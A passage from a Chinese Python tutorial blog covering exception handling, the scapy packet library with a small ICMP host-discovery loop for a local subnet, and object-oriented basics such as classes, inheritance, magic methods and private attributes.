   Unicode 相关的错误</span><br><span class="line">          |              +-- UnicodeDecodeError             Unicode 解码时的错误</span><br><span class="line">          |              +-- UnicodeEncodeError             Unicode 编码时错误</span><br><span class="line">          |              +-- UnicodeTranslateError          Unicode 转换时错误</span><br><span class="line">          |</span><br><span class="line">          +-- Warning                                       警告的基类</span><br><span class="line">               +-- DeprecationWarning                       关于被弃用的特征的警告</span><br><span class="line">               +-- PendingDeprecationWarning                关于特性将会被废弃的警告</span><br><span class="line">               +-- RuntimeWarning              可疑的运行时行为(runtime behavior)的警告</span><br><span class="line">               +-- SyntaxWarning                            可疑的语法的警告</span><br><span class="line">               +-- UserWarning                              用户代码生成的警告</span><br><span class="line">               +-- FutureWarning                            关于构造将来语义会有改变的警告</span><br><span class="line">               +-- ImportWarning               关于模块进口可能出现错误的警告的基类。</span><br><span class="line">               +-- UnicodeWarning                           有关Unicode警告的基类。</span><br><span class="line">               +-- BytesWarning                             有关字节警告相关的基类。</span><br></pre></td></tr></table></figure><h3 id="处理异常"><a href="#处理异常" class="headerlink" title="处理异常"></a>处理异常</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:                                                <span class="comment"># 尝试执行某个语句</span></span><br><span class="line">    num = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;The number:&quot;</span>))</span><br><span class="line"><span class="keyword">except</span> BaseException:                               <span class="comment"># 如果遇到异常，执行的语句</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;something error!&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:                                               <span class="comment"># 如果没有遇到异常，执行的语句</span></span><br><span class="line">    <span class="built_in">print</span>(num)</span><br><span class="line"><span class="keyword">finally</span>:                                            <span class="comment"># 不管是否遇到异常，都要执行的语句。</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;This is finally&quot;</span>)</span><br></pre></td></tr></table></figure><ul><li>else 子句：在try 范围中没有异常被检测到时，执行else 子句。在else 范围中的任何代码运行前，try 范围中的所有代码必须完全成功。</li><li>finally 子句：finally 子句是无论异常是否发生，是否捕捉都会执行的一段代码。比如获取用户的输入，写入文件，但是如果在获取数据过程中，发生了异常，就会导致整个脚本结束执行，文件也无法关闭了。为了解决这个问题，可以采用异常处理中的finally 子句，也就是说，无论语句是否正常执行，都需要关闭。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 03 - 处理异常.py</span></span><br><span class="line"></span><br><span class="line">banner = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">杰哥的算命脚本</span></span><br><span class="line"><span class="string">1. 预测年龄</span></span><br><span class="line"><span class="string">2. 预测财运</span></span><br><span class="line"><span class="string">3. 预测姻缘</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(banner)</span><br><span class="line"></span><br><span class="line">choice = <span class="built_in">input</span>(<span class="string">&quot;Please input the number: &quot;</span>)</span><br><span class="line">choice = <span class="built_in">int</span>(choice)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> choice != <span class="number">1</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;好好学习...&quot;</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    age = <span class="built_in">input</span>(<span class="string">&quot;Please input your age: &quot;</span>)</span><br><span class="line">    age = <span class="built_in">int</span>(age) </span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> ValueError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Please input a number!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nCtrl + C&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nSomething Error!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;The next year your name: <span class="subst">&#123;age + <span class="number">1</span>&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;脚本执行结束，祝你好运！&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="特殊场景"><a href="#特殊场景" class="headerlink" title="特殊场景"></a>特殊场景</h3><h3 id="with-语句"><a href="#with-语句" class="headerlink" title="with 语句"></a>with 语句</h3><p>with 语句是用来简化代码的。比如在将打开文件的操作放在with 语句中，代码块结束后，文件将自动关闭。用来简化文件操作的打开和关闭，其中closed 属性是判断文件是否被关闭的</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;foo.py&#x27;</span>) <span class="keyword">as</span> f:</span><br></pre></td></tr></table></figure><h2 id="内网主机存活检测程序"><a href="#内网主机存活检测程序" class="headerlink" title="内网主机存活检测程序"></a>内网主机存活检测程序</h2><h3 id="scapy-模块"><a href="#scapy-模块" class="headerlink" title="scapy 模块"></a>scapy 模块</h3><p>与scrapy 有非常大的区别。</p><p>scapy 是一个Python 的第三方模块，被称为“网络神器”。scapy 模块能够发送、捕获、分析和铸造网络数据包。</p><h3 id="主要功能"><a href="#主要功能" class="headerlink" title="主要功能"></a>主要功能</h3><p><img src="/%E9%94%99%E8%AF%AF%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E4%B8%8E%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1.assets/v2-52357f80bcb0b3a0393f25849494f3d6_720w.webp" alt="img"></p><h3 id="scapy-安装"><a href="#scapy-安装" class="headerlink" title="scapy 安装"></a>scapy 安装</h3><p>Windows 下安装scapy</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">python -m pip install scapy</span><br></pre></td></tr></table></figure><p>Kali 中自带scapy 环境。</p><h3 id="进入scapy-模块"><a href="#进入scapy-模块" class="headerlink" title="进入scapy 模块"></a>进入scapy 模块</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">┌──(cgji1 zh-CN)-[~]</span><br><span class="line">└─$ sudo scapy                     </span><br><span class="line"></span><br><span class="line">                     aSPY//YASa       </span><br><span class="line">             apyyyyCY//////////YCa       |</span><br><span class="line">            sY//////YSpcs  scpCY//Pp     | Welcome to Scapy</span><br><span class="line"> ayp ayyyyyyySCP//Pp           syY//C    | Version <span class="number">2.4</span><span class="number">.5</span></span><br><span class="line"> AYAsAYYYYYYYY///Ps              cY//S   |</span><br><span class="line">         pCCCCY//p          cSSps y//Y   | https://github.com/secdev/scapy</span><br><span class="line">         SPPPP///a          pP///AC//Y   |</span><br><span class="line">              A//A            cyP////C   | Have fun!</span><br><span class="line">              p///Ac            sC///a   |</span><br><span class="line">              P////YCpc           A//A   | Craft packets before they craft</span><br><span class="line">       scccccp///pSP///p          p//Y   | you.</span><br><span class="line">      sY/////////y  caa           S//P   |                      -- Socrate</span><br><span class="line">       cayCyayP//Ya              pY/Ya   |</span><br><span class="line">        sY/PsY////YCc          aC//Yp </span><br><span class="line">         sc  sccaCY//PCypaapyCP//YSs  </span><br><span class="line">                  spCPY//////YPSps    </span><br><span class="line">                       ccaacs         </span><br><span class="line">                                       using IPython <span class="number">7.22</span><span class="number">.0</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h3 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h3><p>构造数据包</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>pkt = IP()/TCP()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pkt.show()</span><br><span class="line"><span class="comment">###[ IP ]### </span></span><br><span class="line">  version   = <span class="number">4</span></span><br><span class="line">  ihl       = <span class="literal">None</span></span><br><span class="line">  tos       = <span class="number">0x0</span></span><br><span class="line">  <span class="built_in">len</span>       = <span class="literal">None</span></span><br><span class="line">  <span class="built_in">id</span>        = <span class="number">1</span></span><br><span class="line">  flags     = </span><br><span class="line">  frag      = <span class="number">0</span></span><br><span class="line">  ttl       = <span class="number">64</span></span><br><span class="line">  proto     = tcp</span><br><span class="line">  chksum    = <span class="literal">None</span></span><br><span class="line">  src       = <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">  dst       = <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">  \options   \</span><br><span class="line"><span class="comment">###[ TCP ]### </span></span><br><span class="line">     sport     = ftp_data</span><br><span class="line">     dport     = http</span><br><span class="line">     seq       = <span class="number">0</span></span><br><span class="line">     ack       = <span class="number">0</span></span><br><span class="line">     dataofs   = <span class="literal">None</span></span><br><span class="line">     reserved  = <span class="number">0</span></span><br><span class="line">     flags     = S</span><br><span class="line">     window    = <span class="number">8192</span></span><br><span class="line">     chksum    = <span class="literal">None</span></span><br><span class="line">     urgptr    = <span class="number">0</span></span><br><span class="line">     options   = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pkt = IP(src = <span class="string">&quot;192.168.1.11&quot;</span>, dst = <span class="string">&quot;192.168.1.1&quot;</span>)/TCP()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pkt.show()</span><br><span class="line"><span class="comment">###[ IP ]### </span></span><br><span class="line">  version   = <span class="number">4</span></span><br><span class="line">  ihl       = <span class="literal">None</span></span><br><span class="line">  tos       = <span class="number">0x0</span></span><br><span class="line">  <span class="built_in">len</span>       = <span class="literal">None</span></span><br><span class="line">  <span class="built_in">id</span>        = <span class="number">1</span></span><br><span class="line">  flags     = </span><br><span class="line">  frag      = <span class="number">0</span></span><br><span class="line">  ttl       = <span class="number">64</span></span><br><span class="line">  proto     = tcp</span><br><span class="line">  chksum    = <span class="literal">None</span></span><br><span class="line">  src       = <span class="number">192.168</span><span class="number">.1</span><span class="number">.11</span></span><br><span class="line">  dst       = <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span></span><br><span class="line">  \options   \</span><br><span class="line"><span class="comment">###[ TCP ]### </span></span><br><span class="line">     sport     = ftp_data</span><br><span class="line">     dport     = http</span><br><span class="line">     seq       = <span class="number">0</span></span><br><span class="line">     ack       = <span class="number">0</span></span><br><span class="line">     dataofs   = <span class="literal">None</span></span><br><span class="line">     reserved  = <span class="number">0</span></span><br><span class="line">     flags     = S</span><br><span class="line">     window    = <span class="number">8192</span></span><br><span class="line">     chksum    = <span class="literal">None</span></span><br><span class="line">     urgptr    = <span class="number">0</span></span><br><span class="line">     options   = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>发送数据包</p><table><thead><tr><th>发送数据包的函数</th><th>说明</th></tr></thead><tbody><tr><td>sr(pkt)</td><td>发送数据包，接收所有返回包</td></tr><tr><td>sr1(pkt)</td><td>发送数据包，接收一个返回包</td></tr><tr><td>send(pkt)</td><td>发送数据包，不等待返回包</td></tr><tr><td>srp(pkt)</td><td>发送2 层数据包，等待回应</td></tr><tr><td>sendp(pkt)</td><td>发送2 层数据包，不等待返回包</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>res = sr1(pkt)</span><br><span class="line">Begin emission:</span><br><span class="line">Finished sending <span class="number">1</span> packets.</span><br><span class="line">.*</span><br><span class="line">Received <span class="number">2</span> packets, got <span class="number">1</span> answers, remaining <span class="number">0</span> packets</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>查看返回包</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>res.show()</span><br><span class="line"><span class="comment">###[ IP ]### </span></span><br><span class="line">  version   = <span class="number">4</span></span><br><span class="line">  ihl       = <span class="number">5</span></span><br><span class="line">  tos       = <span class="number">0x0</span></span><br><span class="line">  <span class="built_in">len</span>       = <span class="number">44</span></span><br><span class="line">  <span class="built_in">id</span>        = <span class="number">13990</span></span><br><span class="line">  flags     = </span><br><span class="line">  frag      = <span class="number">0</span></span><br><span class="line">  ttl       = <span class="number">255</span></span><br><span class="line">  proto     = tcp</span><br><span class="line">  chksum    = <span class="number">0x46a4</span></span><br><span class="line">  src       = <span class="number">10.9</span><span class="number">.21</span><span class="number">.1</span></span><br><span class="line">  dst       = <span class="number">10.9</span><span class="number">.21</span><span class="number">.111</span></span><br><span class="line">  \options   \</span><br><span class="line"><span class="comment">###[ TCP ]### </span></span><br><span class="line">     sport     = http</span><br><span class="line">     dport     = ftp_data</span><br><span class="line">     seq       = <span class="number">1510518667</span></span><br><span class="line">     ack       = <span class="number">1</span></span><br><span class="line">     dataofs   = <span class="number">6</span></span><br><span class="line">     reserved  = <span class="number">0</span></span><br><span class="line">     flags     = SA</span><br><span class="line">     window    = <span class="number">65535</span></span><br><span class="line">     chksum    = <span class="number">0x4f9c</span></span><br><span class="line">     urgptr    = <span class="number">0</span></span><br><span class="line">     options   = [(<span class="string">&#x27;MSS&#x27;</span>, <span class="number">1460</span>)]</span><br><span class="line"><span class="comment">###[ Padding ]### </span></span><br><span class="line">        load      = <span class="string">&#x27;\x00\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h3 id="主机存活检测程序"><a href="#主机存活检测程序" class="headerlink" title="主机存活检测程序"></a>主机存活检测程序</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 04 - 内网主机存活检测程序.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.getLogger(<span class="string">&quot;scapy.runtime&quot;</span>).setLevel(logging.ERROR)</span><br><span class="line"></span><br><span class="line">network = <span class="string">&quot;192.168.1.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> host <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">    ip = <span class="string">f&quot;<span class="subst">&#123;network&#125;</span><span class="subst">&#123;host&#125;</span>&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[-] Trying: <span class="subst">&#123;ip&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    pkt = IP(src = <span class="string">&quot;192.168.1.11&quot;</span>, dst = ip)/ICMP()</span><br><span class="line">    res = sr1(pkt, timeout = <span class="number">0.2</span>, verbose = <span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> res :</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] Alive: <span class="subst">&#123;ip&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="面向对象编程"><a href="#面向对象编程" class="headerlink" title="面向对象编程"></a>面向对象编程</h2><h3 id="类"><a href="#类" class="headerlink" title="类"></a>类</h3><p>类是一类事物的统称，比如学生。对象就是类的实例化。</p><p>类有属性（变量），比如学生的姓名、性别、年龄、成绩等，也就是编程里面的变量。</p><p>类有方法（函数），比如学生的上课、下课等，也就是编程里面的函数。</p><h3 id="创建类"><a href="#创建类" class="headerlink" title="创建类"></a>创建类</h3><p>类是一种数据结构，我们可以用它来定义对象，对象把数据值和行为特性融合在一起。Python 使用<code>class</code> 关键字来创建类：通常类名的第一个字母大写，推荐使用驼峰式命名法，单词首字母均大写。类有属性（变量）和方法（动作，函数）组成。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ClassName</span>(<span class="title class_ inherited__">bases</span>):</span><br><span class="line">    <span class="string">&#x27;class documentation string&#x27;</span>    <span class="comment">#&#x27;类文档字符串&#x27;</span></span><br><span class="line">    class_suite                     <span class="comment"># 类体</span></span><br></pre></td></tr></table></figure><h3 id="init-方法"><a href="#init-方法" class="headerlink" title="init 方法"></a><strong>init</strong> 方法</h3><p><code>__init__()</code> 是类的实例（对象）创建后第一个被调用的方法，通常被用来进行对象中属性（变量）的初始化。设置实例的属性可以在实例创建后任意时间进行，但是通常情况下优先在<code>__init__()</code> 方法中实现。</p><ul><li>定义类型</li><li>实例化对象（创建一个对象）</li><li>初始化对象（第一次给对象属性赋值）</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 05 - __init__.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Stu</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, sex, age, score</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.sex = sex</span><br><span class="line">        self.age = age</span><br><span class="line">        self.score = score</span><br><span class="line"></span><br><span class="line">stu1 = Stu(name = <span class="string">&quot;cgji1&quot;</span>, sex = <span class="literal">True</span>, age = <span class="number">24</span>, score = <span class="number">59.9</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;stu1.name&#125;</span> 的成绩是<span class="subst">&#123;stu1.score&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><h3 id="绑定方法"><a href="#绑定方法" class="headerlink" title="绑定方法"></a>绑定方法</h3><p>方法仅仅是类内部定义的函数，方法只有在其所属的类拥有实例时，才能被调用；任何一个方法定义中的第一个参数都是变量self，它表示调用此方法的实例对象就是自己。</p><p>类中的方法，也就是类中定义的函数，这个函数第一个参数永远是self，表示自己。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 06 - 绑定方法.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Stu</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, sex, age, score</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.sex = sex</span><br><span class="line">        self.age = age</span><br><span class="line">        self.score = score</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getSocre</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;self.name&#125;</span> 的成绩是<span class="subst">&#123;self.score&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">goodGoodStudy</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;好好学习中...&quot;</span>)</span><br><span class="line">        time.sleep(<span class="number">10</span>)</span><br><span class="line">        self.score += <span class="number">0.1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">stu1 = Stu(name = <span class="string">&quot;cgji1&quot;</span>, sex = <span class="literal">True</span>, age = <span class="number">24</span>, score = <span class="number">59.9</span>)</span><br><span class="line">stu2 = Stu(name = <span class="string">&quot;HMM&quot;</span>, sex = <span class="literal">True</span>, age = <span class="number">24</span>, score = <span class="number">89.9</span>)</span><br><span class="line"></span><br><span class="line">stu2.getSocre()</span><br><span class="line">stu2.goodGoodStudy()</span><br><span class="line">stu2.getSocre()</span><br></pre></td></tr></table></figure><h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><h3 id="子类继承"><a href="#子类继承" class="headerlink" title="子类继承"></a>子类继承</h3><p>继承描述了基类（祖先）的属性如何遗传给派生类（子孙），子类可以继承它的基类的任何属性，不管是数据属性还是方法。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 34 - 子类继承.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Kid</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name = <span class="string">&quot;&quot;</span>, sex = <span class="string">&quot;&quot;</span>, age = <span class="string">&quot;&quot;</span></span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line">        self.sex = sex</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">play</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;玩游戏中...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Stu</span>(<span class="title class_ inherited__">Kid</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name = <span class="string">&quot;&quot;</span>, sex = <span class="string">&quot;&quot;</span>, age = <span class="string">&quot;&quot;</span>, score = <span class="string">&quot;&quot;</span></span>):</span><br><span class="line">        Kid.__init__(self, name, sex, age)</span><br><span class="line">        self.score = score</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_score</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;self.name&#125;</span> 的成绩是<span class="subst">&#123;self.score&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">good_good_study</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;好好学习中...&quot;</span>)</span><br><span class="line">        time.sleep(<span class="number">10</span>)</span><br><span class="line">        self.score += <span class="number">0.1</span></span><br><span class="line"></span><br><span class="line">stu1 = Stu(name = <span class="string">&quot;cgji1&quot;</span>, sex = <span class="literal">True</span>, age = <span class="number">24</span>, score = <span class="number">59.9</span>)</span><br><span class="line">stu2 = Stu(name = <span class="string">&quot;LL&quot;</span>, sex = <span class="literal">True</span>, age = <span class="number">25</span>, score = <span class="number">49.9</span>)</span><br><span class="line">stu3 = Stu(name = <span class="string">&quot;HMM&quot;</span>, sex = <span class="literal">True</span>, age = <span class="number">23</span>, score = <span class="number">99.9</span>)</span><br><span class="line">stu4 = Stu(name = <span class="string">&quot;LH&quot;</span>, sex = <span class="literal">True</span>, age = <span class="number">24</span>, score = <span class="number">79.9</span>)</span><br><span class="line"></span><br><span class="line">stu1.play()</span><br></pre></td></tr></table></figure><h3 id="方法重写"><a href="#方法重写" class="headerlink" title="方法重写"></a>方法重写</h3><p>如果子类中有和父类同名的方法，父类方法将被覆盖；如果需要访问父类的方法，则要调用一个未绑定的父类方法，明确给出子类的实例。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 08 - 方法重写.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Kid</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, sex, age</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.sex = sex</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">play</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;玩游戏中...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Stu</span>(<span class="title class_ inherited__">Kid</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, sex, age, score</span>):</span><br><span class="line">        Kid.__init__(self, name, sex, age)</span><br><span class="line">        self.score = score</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getSocre</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;self.name&#125;</span> 的成绩是<span class="subst">&#123;self.score&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">goodGoodStudy</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;好好学习中...&quot;</span>)</span><br><span class="line">        time.sleep(<span class="number">10</span>)</span><br><span class="line">        self.score += <span class="number">0.1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">play</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;玩王者荣耀中...&quot;</span>)</span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">        self.score -= <span class="number">10</span></span><br><span class="line"></span><br><span class="line">stu1 = Stu(name = <span class="string">&quot;cgji1&quot;</span>, sex = <span class="literal">True</span>, age = <span class="number">24</span>, score = <span class="number">59.9</span>)</span><br><span class="line">stu2 = Stu(name = <span class="string">&quot;HMM&quot;</span>, sex = <span class="literal">True</span>, age = <span class="number">24</span>, score = <span class="number">89.9</span>)</span><br><span class="line"></span><br><span class="line">stu2.getSocre()</span><br><span class="line">stu2.play()</span><br><span class="line">stu2.getSocre()</span><br><span class="line">stu2.goodGoodStudy()</span><br><span class="line">stu2.goodGoodStudy()</span><br><span class="line">stu2.getSocre()</span><br><span class="line">stu2.play()</span><br><span class="line">stu2.getSocre()</span><br></pre></td></tr></table></figure><h3 id="多重继承"><a href="#多重继承" class="headerlink" title="多重继承"></a>多重继承</h3><p>Python 允许多重继承，即一个类可以是多个父类的子类，子类可以拥有所有父类的属性。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 09 - 多重继承.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">a</span>():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;This is function A!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">b</span>():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;This is function B!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span>(A, B):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">C.a()</span><br><span class="line">C.b()</span><br></pre></td></tr></table></figure><h3 id="魔法函数"><a href="#魔法函数" class="headerlink" title="魔法函数"></a>魔法函数</h3><h3 id="类和实例的内建函数"><a href="#类和实例的内建函数" class="headerlink" title="类和实例的内建函数"></a>类和实例的内建函数</h3><table><thead><tr><th>函数</th><th>作用</th></tr></thead><tbody><tr><td>issubclass()</td><td>判断一个类是另一个类的子类或子孙类</td></tr><tr><td>isinstance()</td><td>判定一个对象是否是另一个给定类的实例</td></tr><tr><td>hasattr()</td><td>判断一个对象是否有一个特定的属性</td></tr><tr><td>getattr()</td><td>获得一个对象的属性值</td></tr><tr><td>setattr()</td><td>设置一个对象的属性</td></tr><tr><td>delattr()</td><td>删除一个对象的属性</td></tr></tbody></table><h3 id="常用的魔法函数"><a href="#常用的魔法函数" class="headerlink" title="常用的魔法函数"></a>常用的魔法函数</h3><p>魔法函数是系统自带的，会在“恰当”的时候自动调用。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 10 - 魔术方法.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Function __init__ is called!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Why print(self)?&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__call__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Why call me like Function?&quot;</span>)</span><br><span class="line"></span><br><span class="line">t = Test()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line"></span><br><span class="line">t()</span><br></pre></td></tr></table></figure><h3 id="私有化"><a href="#私有化" class="headerlink" title="私有化"></a>私有化</h3><p>Python 为类元素（属性和方法）的私有性提供初步的形式，由双下划线开始的属性在运行时被“混淆”，所以直接访问是不允许的。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 11 - 私有化.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 06 - 绑定方法.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Stu</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, sex, age, score</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.sex = sex</span><br><span class="line">        self.age = age</span><br><span class="line">        self.__score = score</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getSocre</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;self.name&#125;</span> 的成绩是<span class="subst">&#123;self.__score&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">goodGoodStudy</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;好好学习中...&quot;</span>)</span><br><span 